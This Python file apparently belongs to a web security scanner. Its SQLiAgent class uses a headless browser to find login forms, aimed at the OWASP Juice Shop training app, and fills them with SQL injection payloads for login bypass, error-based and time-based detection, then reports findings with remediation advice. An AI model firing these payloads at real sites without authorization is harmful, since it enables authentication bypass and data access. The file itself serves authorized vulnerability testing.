import asyncio
from .base import BaseAgent
from playwright.async_api import async_playwright
import urllib.parse

class SQLiAgent(BaseAgent):
    async def execute(self):
        await self.emit_event("INFO", f"Starting SQL Injection Hunter on {self.target_url}")
        await self.update_progress(10)

        async with async_playwright() as p:
            # Use a persistent context if we wanted to keep cookies, but incognito is fine for now
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context(
                user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Sentinel/1.0"
            )
            page = await context.new_page()

            try:
                # 1. Navigation & Reconciliation
                await self.emit_event("INFO", "Navigating to target...")
                try:
                    await page.goto(self.target_url, timeout=30000, wait_until="networkidle")
                except Exception as e:
                    await self.emit_event("WARNING", f"Initial navigation timeout/error: {e}. Continuing...")

                await self.update_progress(30)

                # 2. Form Enumeration
                # We specifically look for login forms or any inputs
                forms = await page.evaluate("""() => {
                    const forms = Array.from(document.querySelectorAll('form'));
                    return forms.map((f, i) => {
                        const inputs = Array.from(f.querySelectorAll('input, textarea'));
                        return {
                            index: i,
                            action: f.action,
                            inputs: inputs.map(inp => ({
                                name: inp.name || inp.id || inp.placeholder || 'unknown',
                                type: inp.type,
                                id: inp.id
                            }))
                        };
                    });
                }""")

                await self.emit_event("INFO", f"Found {len(forms)} forms. Analyzing for injection points...")

                # 3. Fuzzing Strategy
                # Juice Shop specific: Login page is usually at /#/login
                # If we are not at login, try to find a login link or go to /login or /#/login
                current_url = page.url
                if "login" not in current_url.lower():
                    await self.emit_event("INFO", "Attempting to locate Login page...")
                    login_link = await page.query_selector('a[href*="login"]')
                    if login_link:
                        await login_link.click()
                        await page.wait_for_load_state("networkidle")
                    else:
                        # Try direct navigation for Juice Shop
                        if "/#" in self.target_url:
                            await page.goto(f"{self.target_url.split('/#')[0]}/#/login")
                        else:
                            await page.goto(f"{self.target_url.rstrip('/')}/login")
                        await page.wait_for_timeout(2000)

                # Re-evaluate forms after navigation
                forms = await page.evaluate("""() => {
                    const forms = Array.from(document.querySelectorAll('form'));
                    return forms.map((f, i) => {
                        const inputs = Array.from(f.querySelectorAll('input:not([type="submit"]):not([type="hidden"]), textarea'));
                        return {
                            index: i,
                            inputs: inputs.map(inp => ({
                                selector: inp.id ? `#${inp.id}` : (inp.name ? `[name="${inp.name}"]` : 'input'),
                                name: inp.name,
                                id: inp.id
                            }))
                        };
                    });
                }""")

                if not forms:
                    # Fallback: finding standalone inputs (Angular apps might not use <form> tags strictly)
                    inputs = await page.evaluate("""() => {
                        const inputs = Array.from(document.querySelectorAll('input[type="text"], input[type="email"], input[type="password"]'));
                        return inputs.map(inp => ({
                            selector: inp.id ? `#${inp.id}` : (inp.name ? `[name="${inp.name}"]` : 'input'),
                            id: inp.id
                        }));
                    }""")
                    if inputs:
                        forms = [{'index': 0, 'inputs': inputs}]
                
                payloads = [
                    # Classic Login Bypass
                    "' OR 1=1--", 
                    "' OR '1'='1",
                    "admin' --",
                    # Error based
                    "'", 
                    "\"",
                    # Time based (sqlite/pg)
                    "1'; SELECT sleep(5);--"
                ]

                # 4. Attack Loop
                vulnerable = False
                for form in forms:
                    for input_field in form['inputs']:
                        # Skip if it's unlikely to be an injection point (e.g. checkbox)
                        # We are targeting text/email/password usually
                        
                        for payload in payloads:
                            await self.emit_event("INFO", f"Injecting payload: {payload} into {input_field['selector']}...")
                            
                            try:
                                # Fill input
                                await page.fill(input_field['selector'], payload)
                                
                                # If there's a password field nearby, fill it with junk
                                password_field = await page.query_selector('input[type="password"]')
                                if password_field:
                                    await password_field.fill("password123")
                                
                                # Try to submit
                                # 1. Look for submit button
                                submit_btn = await page.query_selector('button[type="submit"], button#loginButton, button[aria-label="Login"]')
                                if submit_btn:
                                    await submit_btn.click()
                                else:
                                    await page.press(input_field['selector'], 'Enter')
                                
                                await page.wait_for_load_state("networkidle")
                                await page.wait_for_timeout(1000) # Wait for JS to react

                                # Check for evidence
                                content = await page.content()
                                
                                # 1. Error messages (SQL Syntax)
                                if "SQLITE_ERROR" in content or "syntax error" in content.lower() or "SQL parameter" in content:
                                    await self.report_finding(
                                        severity="CRITICAL",
                                        title=f"SQL Injection (Error Based) in {input_field['selector']}",
                                        evidence=f"Payload: {payload}\nResponse contained SQL error.",
                                        recommendation="Sanitize inputs and use parameterized queries."
                                    )
                                    vulnerable = True

                                # 2. Login Bypass Success (Juice Shop specific)
                                # Juice Shop shows a basket or logout button upon login
                                if "Logout" in content or "Your Basket" in content or "shoppingCart" in page.url:
                                    await self.report_finding(
                                        severity="CRITICAL",
                                        title=f"Authentication Bypass via SQL Injection",
                                        evidence=f"Payload: {payload} in {input_field['selector']} logged the user in successfully.",
                                        recommendation="The login mechanism is vulnerable to SQLi. Ensure the backend uses ORM features correctly or parameterized queries."
                                    )
                                    vulnerable = True
                                    # Take a screenshot specifically here
                                    await self.capture_screenshot(page, "sqli_bypass_success")
                                    break
                                
                                # Reset logic (reload page to clear state)
                                await page.reload()
                                await page.wait_for_load_state("networkidle")

                            except Exception as e:
                                continue # Move to next payload
                        
                        if vulnerable: break
                    if vulnerable: break

                if not vulnerable:
                    await self.emit_event("INFO", "No SQLi vulnerabilities found with standard payloads.")
                else: 
                    await self.emit_event("SUCCESS", "Scan completed. Vulnerabilities found.")

            except Exception as e:
                await self.emit_event("ERROR", f"SQLi scan failed: {str(e)}")
                raise e
            finally:
                await context.close()
                await browser.close()
                await self.update_progress(100)

    async def capture_screenshot(self, page, name):
        try:
            # We can rely on the base class or emit an event
            # BaseAgent doesn't always have a capture_screenshot utility exposed cleanly unless we added it
            # But we can emit the SCREENSHOT event manually if needed, or if BaseAgent has it.
            # Assuming BaseAgent might need modification or we just use playwright's buffer
            screenshot_bytes = await page.screenshot()
            import base64
            b64_img = base64.b64encode(screenshot_bytes).decode('utf-8')
            data_uri = f"data:image/png;base64,{b64_img}"
            
            await self.emit_event("SCREENSHOT", "Screenshot captured", {"image": data_uri})
        except:
            pass
